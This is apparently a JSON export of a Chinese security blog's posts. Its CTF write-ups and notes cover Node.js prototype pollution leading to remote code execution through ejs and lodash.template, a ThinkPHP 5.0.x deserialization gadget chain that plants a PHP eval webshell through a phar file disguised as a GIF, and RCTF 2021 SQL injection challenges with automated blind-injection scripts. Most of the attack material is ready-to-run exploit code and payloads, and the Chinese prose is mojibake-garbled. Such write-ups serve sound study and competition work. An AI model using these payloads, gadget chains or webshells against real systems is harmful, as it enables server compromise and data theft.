{"meta":{"title":"npC4t's Blog","subtitle":"","description":"2571374157@qq.com","author":"npC4t","url":"https://123-prog.github.io","root":"/"},"pages":[{"title":"About","date":"2021-09-22T11:44:02.703Z","updated":"2021-09-22T11:44:02.703Z","comments":true,"path":"about/index.html","permalink":"https://123-prog.github.io/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2021-09-22T11:47:22.213Z","updated":"2021-09-22T11:44:02.703Z","comments":true,"path":"categories/index.html","permalink":"https://123-prog.github.io/categories/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-07-18T13:43:18.000Z","updated":"2021-07-18T13:44:04.571Z","comments":true,"path":"categories_old/index.html","permalink":"https://123-prog.github.io/categories_old/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-09-22T11:47:54.296Z","updated":"2021-09-22T11:44:02.704Z","comments":true,"path":"tags/index.html","permalink":"https://123-prog.github.io/tags/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-07-18T14:04:33.000Z","updated":"2021-07-18T14:05:45.684Z","comments":true,"path":"tags_old/index.html","permalink":"https://123-prog.github.io/tags_old/index.html","excerpt":"","text":""}],"posts":[{"title":"nodejsåŸå‹é“¾æ±¡æŸ“","slug":"nodejsåŸå‹é“¾æ±¡æŸ“","date":"2021-10-03T02:29:52.000Z","updated":"2021-10-03T14:50:37.257Z","comments":true,"path":"2021/10/03/nodejsåŸå‹é“¾æ±¡æŸ“/","link":"","permalink":"https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"è§¦å‘æ±¡æŸ“ç‚¹0x01 lodash.defaultsDeepæ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“","text":"è§¦å‘æ±¡æŸ“ç‚¹0x01 lodash.defaultsDeepæ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“ å½±å“lodash&lt;4.17.12æ‰€æœ‰ç‰ˆæœ¬ï¼Œ4.17.12ä¹‹åä¿®å¤ï¼Œé™¤äº†åŸæœ¬è¿‡æ»¤çš„__proto__ï¼Œæ–°å¢è¿‡æ»¤äº†constructorä»¥é˜²æ­¢æ±¡æŸ“å…¨å±€å¯¹è±¡ 123456var merge = require(&#x27;lodash&#x27;).defaultsDeep;var payload = &#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;hack&quot;:&quot;whoami&quot;&#125;&#125;&#125;&#x27;;merge(&#123;&#125;,JSON.parse(payload));console.log(&#x27;sss&#x27;); 0x02 lodash.mergeï¼Œlodash.mergeWithlodash&lt;4.17.5 12345var lodash= require(&#x27;lodash&#x27;);var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;;lodash.merge(&#123;&#125;,JSON.parse(payload));console.log(1); 0x03 lodash.set ï¼Œlodash.setWith1set(object, path, value) ç”¨äºè®¾ç½®å€¼åˆ°å¯¹è±¡å¯¹äºçš„å±æ€§è·¯å¾„ä¸Š 123456789var object = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;_.set(object, &#x27;a[0].b.c&#x27;, 4);console.log(object.a[0].b.c);// =&gt; 4_.set(object, &#x27;x[0].y.z&#x27;, 5);console.log(object.x[0].y.z);// =&gt; 5 å¦‚æœæ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œåˆ™å¯èƒ½é€ æˆåŸå‹é“¾æ±¡æŸ“ ä¾‹å¦‚ 1234567var lodash = require(&#x27;lodash&#x27;);var object = &#123;&#x27;a&#x27;:[&#123;&#x27;b&#x27;:&#123;&#x27;c&#x27;:3&#125;&#125;]&#125;;lodash.set(object,&#x27;__proto__.hack&#x27;,&#x27;xxx&#x27;);console.log(1); 0x04 Undefsafeæ¨¡å—åŸå‹é“¾æ±¡æŸ“ç”¨äºå¤„ç†è®¿é—®å¯¹è±¡å±æ€§ä¸å­˜åœ¨çš„æŠ¥é”™é—®é¢˜ï¼Œåœ¨ç‰ˆæœ¬å°äº2.0.3ä¸­å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ 123456789var undef = require(&#x27;undefsafe&#x27;);var object=&#123;&#125;console.log(undef(object,&#x27;c&#x27;));//undefine,cå±æ€§ä¸å­˜åœ¨undef(object,&#x27;c&#x27;,1);console.log(object)//è¦†ç›–ç±»å±æ€§å€¼ï¼Œå­˜åœ¨çš„è¯ï¼Œä¿®æ”¹ï¼Œä¸å­˜åœ¨ï¼Œåˆ›å»ºï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªå±æ€§cï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ±¡æŸ“åŸå‹é“¾ 123456var undef = require(&#x27;undefsafe&#x27;);var object=&#123;&#125;undef(object,&#x27;__proto__.hack&#x27;,&#x27;xxx&#x27;);console.log(1); RCE0x01 æ±¡æŸ“ejså®ç°rceåˆ©ç”¨ç‚¹ï¼š å¯ä»¥çœ‹åˆ°opts.outputFunctionNameæ­¤æ—¶æ˜¯undefinedï¼Œåˆ©ç”¨åŸå‹é“¾æ±¡æŸ“è¿™ä¸ªå˜é‡ï¼Œå¯å®ç°ä»£ç æ³¨å…¥ ä¾‹å¦‚æ„é€ ä»£ç  1a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);// ä¾¿å¯ä»¥å®ç°rce ç®€å•mergeæ“ä½œçš„æ±¡æŸ“payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);//&quot;&#125;&#125; 0x02 åˆ©ç”¨lodash.templateå®ç°RCE æ±¡æŸ“options.sourceURLå³å¯æ³¨å…¥ä»£ç  1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; payload 1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\nreturn global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)//&quot;&#125;&#125; æ‹¿åˆ°flagè‡ªåŠ¨åˆ é™¤æ±¡æŸ“çš„sourceURL 1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;\\n//&quot;&#125;&#125;","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"https://123-prog.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"gadgetchains","slug":"gadgetchains","date":"2021-09-26T09:23:46.000Z","updated":"2021-10-03T14:46:21.801Z","comments":true,"path":"2021/09/26/gadgetchains/","link":"","permalink":"https://123-prog.github.io/2021/09/26/gadgetchains/","excerpt":"0x01 thinkphp 5.0.4~5.0.24","text":"0x01 thinkphp 5.0.4~5.0.24 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpnamespace think&#123; use think\\session\\driver\\Memcache; class Process&#123; private $status = &#x27;&#x27;; private $processPipes; private $processInformation; public function __construct()&#123; $this-&gt;processInformation[&#x27;running&#x27;] = true; $this-&gt;status = &#x27;starte&#x27;; //started,ä¸åŒå°±è¡Œ $this-&gt;processPipes = new Memcache(); &#125; &#125;&#125;namespace think\\session\\driver&#123; use think\\model\\relation\\HasMany; class Memcache&#123; protected $handler = null; public function __construct()&#123; $this-&gt;handler = new HasMany(); //close() &#125; &#125;&#125;namespace think&#123; class Model&#123; &#125;&#125;namespace think\\model&#123; //ä¸ºäº†æ»¡è¶³è·³æ¿çš„æ¡ä»¶è€Œæ„å»º use think\\Model; class Merge extends Model&#123; public $a = &#x27;1&#x27;; public function __construct()&#123; &#125; &#125;&#125;namespace think\\model&#123; class Relation&#123;&#125;&#125;namespace think\\db&#123; class Query&#123;&#125;&#125;namespace think\\model\\relation&#123; use think\\console\\Output; use think\\db\\Query; use think\\model\\Merge; use think\\model\\Relation; class HasMany extends Relation&#123; protected $parent; protected $localKey=&#x27;a&#x27;; protected $foreignKey=&#x27;a&#x27;; protected $pivot; public function __construct() &#123; $this-&gt;query = new Output(); $this-&gt;parent = new Merge(); &#125; &#125;&#125;namespace think\\console&#123; use think\\session\\driver\\Memcached; class Output&#123; //æ‰¾åˆ°é“¾å…¥å£ï¼Œ_call private $handle; protected $styles; protected $config; function __construct() &#123; $this-&gt;styles = [&#x27;where&#x27;]; $this-&gt;handle = new Memcached(); //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver&#123; use think\\cache\\driver\\File; class Memcached&#123; protected $handler; function __construct() &#123; $this-&gt;handler = new File(); //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver&#123; class File&#123; protected $options = null; protected $tag; public function __construct()&#123; $this-&gt;options[&#x27;expire&#x27;] = &#x27;3306&#x27;; $this-&gt;options[&#x27;cache_subdir&#x27;] = false; $this-&gt;options[&#x27;prefix&#x27;] = false; #$this-&gt;options[&#x27;path&#x27;] = &#x27;uploads/aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/&#x27;; $this-&gt;options[&#x27;path&#x27;] = &#x27;php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/resource=/var/www/html/public/aPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../uploads/&#x27;; $this-&gt;options[&#x27;data_compress&#x27;] = false; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace&#123; $data = new think\\Process(); echo urlencode(serialize($data)); @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub $phar-&gt;setMetadata($data); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); rename(&#x27;phar.phar&#x27;,&#x27;phar.gif&#x27;);&#125; 12345ä»»æ„å†™æ–‡ä»¶:1.Fileç±»çš„å˜é‡$this-&gt;options[&#39;path&#39;]æ§åˆ¶å†™å…¥æ–‡ä»¶çš„ç›®å½•ï¼Œç›®å½•ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯shell(post ccc)ï¼Œåé¢ä¼šè¢«å†™åˆ°æ–‡ä»¶ä¸­æ³¨ï¼šè·¯å¾„æœ€å¥½æ˜¯ç»å¯¹è·¯å¾„ï¼Œå¯¹äºphpææ„å‡½æ•°æ¥è¯´ï¼Œæœ‰æ—¶å€™å·¥ä½œç›®å½•ä¼šä¸æ­£å¸¸ä¸åŒï¼Œä¾‹å¦‚apacheæœåŠ¡å™¨ï¼Œphpææ„å‡½æ•°çš„å·¥ä½œç›®å½•åœ¨æ ¹ç›®å½•2.ç”Ÿæˆshellçš„æ–‡ä»¶åæ„æˆä¸º md5(&#39;tag_&#39; . md5($this-&gt;tag)),æŒ‰ç…§ä¸Šé¢ç»™å‡ºçš„tagï¼Œç”Ÿæˆçš„shellæ–‡ä»¶ååº”è¯¥æ˜¯12ac95f1498ce51d2d96a249c09c1998.php 0x02 å¾…ç»­ã€‚ã€‚ã€‚","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"phpååºåˆ—åŒ–","slug":"phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"(RCTF2021)ns_shaft_sql","slug":"RCTF2021-ns-shaft-sql","date":"2021-09-18T08:51:11.000Z","updated":"2021-09-22T10:21:48.644Z","comments":true,"path":"2021/09/18/RCTF2021-ns-shaft-sql/","link":"","permalink":"https://123-prog.github.io/2021/09/18/RCTF2021-ns-shaft-sql/","excerpt":"0x01 æºç ","text":"0x01 æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);session_start();include_once &quot;config.php&quot;;include_once &quot;flag.php&quot;;function init_status() &#123; if (!isset($_SESSION[&#x27;floor&#x27;])) &#123; $_SESSION[&#x27;floor&#x27;] = 1; &#125; if (!isset($_SESSION[&#x27;disabled_functions&#x27;])) &#123; $_SESSION[&#x27;disabled_functions&#x27;] = array(); &#125; if (!isset($_SESSION[&#x27;k&#x27;])) &#123; $_SESSION[&#x27;k&#x27;] = random_str(8); &#125;&#125;function reset_status() &#123; $_SESSION[&#x27;floor&#x27;] = 1; $_SESSION[&#x27;disabled_functions&#x27;] = array(); $_SESSION[&#x27;k&#x27;] = random_str(8);&#125;function random_str($length=0) &#123; $ss = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; if ($length == 0) &#123; $length = mt_rand(10, 20); &#125; $res = &quot;&quot;; for($i=0; $i&lt;$length; $i++) &#123; $res .= $ss[mt_rand(0, 61)]; &#125; return $res;&#125;function random_str2() &#123; $ss = &quot;0123456789&quot;; $length = mt_rand(10, 17); $res = &quot;&quot;; $res .= $ss[mt_rand(1, 9)]; for($i=0; $i&lt;$length; $i++) &#123; $res .= $ss[mt_rand(0, 9)]; &#125; return $res;&#125;function extract_function($query, $err_msg, $err_code, $sqlstate) &#123; global $mysql_functions; $allowed_functions = array(&quot;concat&quot;, &quot;unhex&quot;); $funcs = array(); $query_arr = preg_split(&quot;/[^a-zA-Z0-9_]/&quot;, strtolower($query)); foreach($mysql_functions as $func) &#123; $func = strtolower($func); if(!in_array($func, $allowed_functions) &amp;&amp; in_array($func, $query_arr)) &#123; array_push($funcs, $func); &#125; &#125; return $funcs;&#125;init_status();$max_floor = 0x2e;if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); exit(0);&#125;if (isset($_GET[&#x27;reset&#x27;])) &#123; reset_status(); printf(&quot;Reset successfully!&quot;); exit(0);&#125;printf(&quot;You are on floor %d.\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;floor&#x27;]);printf(&quot;Your key is %s\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;k&#x27;]);printf(&quot;Disabled Functions: %s\\n&lt;br&gt;\\n&quot;, implode(&quot;, &quot;, $_SESSION[&#x27;disabled_functions&#x27;]));if (!isset($_REQUEST[&#x27;sql&#x27;])) &#123; highlight_file(__FILE__); exit(0);&#125;$query = base64_decode($_REQUEST[&#x27;sql&#x27;]);if (empty($query) || strlen($query) &gt; 0x100 || !ctype_print($query)) &#123; die(&quot;Die&quot;);&#125;$disabled_functions = $_SESSION[&#x27;disabled_functions&#x27;];foreach ($disabled_functions as $func) &#123; if (stripos($query, $func) !== false) &#123; die(&quot;Die&quot;); &#125;&#125;$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);$k = $_SESSION[&#x27;k&#x27;];$v = random_str2();if (!$mysqli-&gt;query(&quot;DELETE FROM `s` WHERE k=&#x27;$k&#x27;;&quot;)) &#123; die(&quot;Die&quot;);&#125;if (!$mysqli-&gt;query(&quot;INSERT INTO `s` (`k`, `v`) values (&#x27;$k&#x27;, &#x27;$v&#x27;);&quot;)) &#123; die(&quot;Die&quot;);&#125;if ($mysqli-&gt;query($query) === false) &#123; $err_msg = mysqli_error($mysqli); if (!empty($err_msg) &amp;&amp; (strpos($err_msg, $v) !== false)) &#123; $funcs = extract_function($query, $err_msg, $err_code, $sqlstate); if (empty($funcs)) &#123; die(&quot;Die&quot;); &#125; foreach($funcs as $func) &#123; if (in_array($func, $disabled_functions)) &#123; die(&quot;Die&quot;); &#125; &#125; $_SESSION[&#x27;floor&#x27;] += 1; $_SESSION[&#x27;disabled_functions&#x27;] = array_merge($_SESSION[&#x27;disabled_functions&#x27;], $funcs); if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); &#125; else &#123; printf(&quot;Success! You are on floor %d, and your key is %s.\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;floor&#x27;], $_SESSION[&#x27;k&#x27;]); printf(&quot;Disabled Functions: %s\\n&lt;br&gt;\\n&quot;, implode(&quot;, &quot;, $_SESSION[&#x27;disabled_functions&#x27;])); &#125; exit(0); &#125;&#125;die(&quot;Die&quot;);?&gt; ç®€å•å®¡è®¡ä¸€ä¸‹ è·å–flagçš„æ¡ä»¶ 12345$max_floor = 0x2e;if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); exit(0);&#125; $_SESSION[&#39;floor&#39;]å¢åŠ çš„æ¡ä»¶ 123456789101112131415161718192021222324if ($mysqli-&gt;query($query) === false) &#123; $err_msg = mysqli_error($mysqli); if (!empty($err_msg) &amp;&amp; (strpos($err_msg, $v) !== false)) &#123; $funcs = extract_function($query, $err_msg, $err_code, $sqlstate); if (empty($funcs)) &#123; die(&quot;Die&quot;); &#125; foreach($funcs as $func) &#123; if (in_array($func, $disabled_functions)) &#123; die(&quot;Die&quot;); &#125; &#125; $_SESSION[&#x27;floor&#x27;] += 1; $_SESSION[&#x27;disabled_functions&#x27;] = array_merge($_SESSION[&#x27;disabled_functions&#x27;], $funcs); if ($_SESSION[&#x27;floor&#x27;] &gt; $max_floor) &#123; printf(&quot;Congratulations! and flag is %s\\n&lt;br&gt;\\n&quot;, $flag); &#125; else &#123; printf(&quot;Success! You are on floor %d, and your key is %s.\\n&lt;br&gt;\\n&quot;, $_SESSION[&#x27;floor&#x27;], $_SESSION[&#x27;k&#x27;]); printf(&quot;Disabled Functions: %s\\n&lt;br&gt;\\n&quot;, implode(&quot;, &quot;, $_SESSION[&#x27;disabled_functions&#x27;])); &#125; exit(0); &#125;&#125; æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š 1.ä¼ å…¥çš„queryæŸ¥è¯¢æŠ¥é”™ï¼Œè¿”å›false 2.æŠ¥é”™ä¿¡æ¯ä¸­åŒ…å«å˜é‡$vï¼Œéšæœºçš„å­—ç¬¦ä¸²ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½ä¼šé‡æ–°ç”Ÿæˆï¼Œå¹¶å­˜æ”¾åœ¨æ•°æ®åº“ä¸­ 3.extract_function()å‡½æ•°è¿”å›å€¼ä¸ä¸ºç©º extract_function()å‡½æ•°å¤§è‡´åŠŸèƒ½æ˜¯åˆ¤æ–­æˆ‘ä»¬queryæ˜¯å¦ä½¿ç”¨äº†å…¨å±€æ•°ç»„$mysql_functionsï¼Œè¿™ä¸ªæ•°ç»„é‡Œé¢æ˜¯mysqlçš„ä¸€äº›å‡½æ•° 12345678910111213function extract_function($query, $err_msg, $err_code, $sqlstate) &#123; global $mysql_functions; $allowed_functions = array(&quot;concat&quot;, &quot;unhex&quot;); $funcs = array(); $query_arr = preg_split(&quot;/[^a-zA-Z0-9_]/&quot;, strtolower($query)); foreach($mysql_functions as $func) &#123; $func = strtolower($func); if(!in_array($func, $allowed_functions) &amp;&amp; in_array($func, $query_arr)) &#123; array_push($funcs, $func); &#125; &#125; return $funcs;&#125; æ»¡è¶³æ¡ä»¶çš„payloadé¦–å…ˆè¯­å¥æŠ¥é”™ä¸”æŠ¥é”™ä¿¡æ¯ä¸­ä¼šå‡ºç°å˜é‡$v 1set @@sql_mode:&#x3D;(select v from s where k&#x3D;$k); æ‰§è¡Œå¦‚ä¸Šè¯­å¥ï¼Œä¼šå‡ºç°æŠ¥é”™ä¿¡æ¯ï¼Œæ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ 1&#39;sql_mode&#39; can&#39;t be set to the value of &#39;796016918671763&#39; æŸ¥è¯¢è¯­å¥è¿˜éœ€è¦å‡ºç°æ•°ç»„$mysql_functionsä¸­çš„å‡½æ•°ï¼Œç›´æ¥åœ¨åé¢æ·»åŠ æ³¨é‡Š 1set @@sql_mode:&#x3D;(select v from s where k&#x3D;$k)&#x2F;*$func*&#x2F;; NU1Lçš„è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164#-*-coding=utf-8-*-import requestsimport base64s = requests.Session()url = &quot;http://124.71.132.232:23334/&quot;def execute(query): global s,url query = base64.b64encode(query.encode()) res = s.get(url+&quot;?sql=&quot;+query.decode()).text print(res) k = res.split(&quot;Your key is &quot;)[1].split(&#x27;\\n&#x27;)[0].strip() return kdef create_func(): c_query = &#x27;&#x27;&#x27;select 123;&#x27;&#x27;&#x27; print(c_query) return execute(c_query)k = create_func() #æ‹¿åˆ°åˆå§‹keyl = &#x27;&#x27;&#x27;ASCIICHAR_LENGTHCHARACTER_LENGTHCONCATCONCAT_WSFIELDFIND_IN_SETFORMATINSERTINSTRLCASELEFTLENGTHLOCATELOWERLPADLTRIMMIDPOSITIONREPEATREPLACEREVERSERIGHTRPADRTRIMSPACESTRCMPSUBSTRSUBSTRINGSUBSTRING_INDEXTRIMUCASEUPPERABSACOSASINATANATAN2AVGCEILCEILINGCOSCOTCOUNTDEGREESDIVEXPFLOORGREATESTLEASTLNLOGLOG10LOG2MAXMINMODPIPOWPOWERRADIANSRANDROUNDSIGNSINSQRTSUMTANTRUNCATEADDDATEADDTIMECURDATECURRENT_DATECURRENT_TIMECURRENT_TIMESTAMPCURTIMEDATEDATE_ADDDATE_FORMATDATE_SUBDATEDIFFDAYDAYNAMEDAYOFMONTHDAYOFWEEKDAYOFYEAREXTRACTFROM_DAYSHOURLAST_DAYLOCALTIMELOCALTIMESTAMPMAKEDATEMAKETIMEMICROSECONDMINUTEMONTHMONTHNAMENOWPERIOD_ADDPERIOD_DIFFQUARTERSEC_TO_TIMESECONDSTR_TO_DATESUBDATESUBTIMESYSDATETIMETIME_FORMATTIME_TO_SECTIMEDIFFTIMESTAMPTO_DAYSWEEKWEEKDAYWEEKOFYEARYEARYEARWEEKBINBINARYCASECASTCOALESCECandyShop CONNECTION_IDCONVCONVERTCURRENT_USERDATABASEIFIFNULLISNULLLAST_INSERT_IDNULLIFSESSION_USERSYSTEM_USERUSERVERSIONENCRYPTMD5OLD_PASSWORDPASSWORD&#x27;&#x27;&#x27;l = l.split(&quot;\\n&quot;)for i in l: execute(&quot;set @@sql_mode:=(select v from s where k=&#x27;&quot;+k+&quot;&#x27;)/*&quot;+i+&quot;*/;&quot;) 0x02 EasySQLi12345678910111213141516&lt;?phprequire_once(&#x27;db.php&#x27;);highlight_file(__FILE__);set_time_limit(1);$s = floatval(microtime());$order = $_GET[&#x27;order&#x27;] ?? 1;$sql = &quot;SELECT CONCAT(&#x27;RCTF&#123;&#x27;,USER(),&#x27;&#125;&#x27;) AS FLAG WHERE &#x27;ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬&#x27; = &#x27;ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬&#x27; OR &#x27;ğŸ¬Watch Diana a dayğŸ¬&#x27; = &#x27;ğŸ¬Keep hunger awayğŸ¬&#x27; OR &#x27;ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬&#x27; = &#x27;ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬&#x27; ORDER BY $order;&quot;;$stm = $pdo-&gt;prepare($sql);$stm-&gt;execute();echo &quot;Count &#123;$stm-&gt;rowCount()&#125;.&quot;;usleep((1 + floatval(microtime()) - $s) * 1e6);Count 0. order byæ³¨å…¥ï¼Œä½†æ˜¯æŸ¥è¯¢å¾—åˆ°çš„row count=0ï¼Œé»˜è®¤order by åé¢çš„è¯­å¥ä¸ä¼šæ‰§è¡Œ ä½†åœ¨sqlè¯­å¥é¢„å¤„ç†æ—¶ï¼Œä¼šæå‰å¯¹sqlè¯­å¥è¿›è¡Œä¼˜åŒ–ï¼Œä¹Ÿå°±ä¼šæ‰§è¡ŒæŸäº›è¯­å¥ å†ç”¨ifåˆ¤æ–­ï¼Œæ„é€ æŸ¥è¯¢æ—¶é—´å·®è¿›è¡Œåˆ¤æ–­ NU1Lçš„payloadï¼Œåˆ©ç”¨é•¿å­—ç¬¦ä¸²çš„æ‹¼æ¥æ„é€ çš„æ—¶é—´å·®ï¼Œå¤§æ¦‚çš„æ—¶é—´å·®åœ¨0.5så·¦å³ 12payload=&quot;updatexml(1,if(ascii(substr((&#123;&#125;)&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;,concat(repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;a&#x27;,40000000),repeat(&#x27;b&#x27;,10000000)),1),1)&quot; Redbudçš„payload 1payload=&quot;updatexml(1,if(ascii(substr((&#123;&#125;)&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),1),1)&quot; ä¹Ÿæ˜¯æ„é€ é•¿å­—ç¬¦ä¸²ï¼Œä½†ç”¨çš„æ˜¯hexï¼Œæ—¶é—´å·®å¤§æ¦‚åœ¨2så·¦å³ è„šæœ¬å°±å¾ˆç®€å•äº† 123456789101112131415161718import requestsimport stringalp = string.digits+string.ascii_letters+string.punctuation#print(alp)url = &#x27;http://124.71.132.232:11002/&#x27;flag = &#x27;&#x27;for i in range(100): for x in alp: order = &#x27;&#x27;&#x27;updatexml(1,if(substr((select user()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),1),1)&#x27;&#x27;&#x27;.format(i,x) r = requests.get(url,params=&#123;&#x27;order&#x27;:order&#125;) print(r.elapsed.total_seconds()) if r.elapsed.total_seconds() &gt; 2: flag += x print(flag) break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sqlæ³¨å…¥","slug":"CTF/sqlæ³¨å…¥","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"æ§åˆ¶é”™è¯¯ä¿¡æ¯","slug":"æ§åˆ¶é”™è¯¯ä¿¡æ¯","permalink":"https://123-prog.github.io/tags/%E6%8E%A7%E5%88%B6%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF/"},{"name":"order by æ— æŸ¥è¯¢æ•°æ® åŸºäºæ—¶é—´ç›²æ³¨","slug":"order-by-æ— æŸ¥è¯¢æ•°æ®-åŸºäºæ—¶é—´ç›²æ³¨","permalink":"https://123-prog.github.io/tags/order-by-%E6%97%A0%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"}]},{"title":"(RCTF2021)VerySafe","slug":"RCTF2021-VerySafe","date":"2021-09-17T14:56:14.000Z","updated":"2021-09-22T10:21:35.732Z","comments":true,"path":"2021/09/17/RCTF2021-VerySafe/","link":"","permalink":"https://123-prog.github.io/2021/09/17/RCTF2021-VerySafe/","excerpt":"0x01 é¢˜ç›®ç¬¬ä¸€æ¬¡çœ‹åˆ°è¿™æ ·çš„é¢˜ï¼Œæ•´ä¸ªé¢˜æ„£æ˜¯ä¸€ç‚¹ä»£ç éƒ½æ²¡æœ‰ ç»™äº†docker-composeæ–‡ä»¶","text":"0x01 é¢˜ç›®ç¬¬ä¸€æ¬¡çœ‹åˆ°è¿™æ ·çš„é¢˜ï¼Œæ•´ä¸ªé¢˜æ„£æ˜¯ä¸€ç‚¹ä»£ç éƒ½æ²¡æœ‰ ç»™äº†docker-composeæ–‡ä»¶ 123456789101112131415version: &#x27;3&#x27;services: caddy: image: caddy:2.4.2 restart: unless-stopped volumes: - ./conf/Caddyfile:/etc/caddy/Caddyfile ports: - &quot;54120:80&quot; php: image: php:7.4-fpm-alpine restart: unless-stopped working_dir: /srv volumes: - ./src:/srv 